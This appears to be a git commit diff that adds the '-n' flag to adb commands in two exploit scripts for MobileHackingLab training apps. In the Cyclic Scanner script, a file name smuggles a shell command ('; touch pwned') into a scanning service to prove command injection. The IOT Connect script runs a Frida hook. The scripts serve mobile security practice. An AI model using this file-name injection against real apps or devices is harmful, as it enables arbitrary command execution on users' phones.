0c11772ad0a2fff5025278fbab70d2bbc527f3e1
mamatb <amatbaeza@proton.me>
2026-03-10 17:44:48 +0100

    added the activity manager flag for components

--- Cyclic Scanner/com.mobilehackinglab.cyclicscanner.sh
+++ Cyclic Scanner/com.mobilehackinglab.cyclicscanner.sh
@@ -1,7 +1,7 @@
 adb install com.mobilehackinglab.cyclicscanner.apk
 adb shell 'touch /sdcard/Download/\;\ touch\ pwned'
 adb shell 'appops set com.mobilehackinglab.cyclicscanner MANAGE_EXTERNAL_STORAGE allow'
-adb shell 'am start-foreground-service com.mobilehackinglab.cyclicscanner/.scanner.ScanService'
+adb shell 'am start-foreground-service -n com.mobilehackinglab.cyclicscanner/.scanner.ScanService'
 sleep 8
 adb shell 'ls /sdcard/'
 
--- IOT Connect/com.mobilehackinglab.iotconnect.sh
+++ IOT Connect/com.mobilehackinglab.iotconnect.sh
@@ -1,4 +1,4 @@
 adb install com.mobilehackinglab.iotconnect.apk
-adb shell 'am start com.mobilehackinglab.iotconnect/.LoginActivity'
+adb shell 'am start -n com.mobilehackinglab.iotconnect/.LoginActivity'
 frida -U -l com.mobilehackinglab.iotconnect.js 'IOT Connect'
 
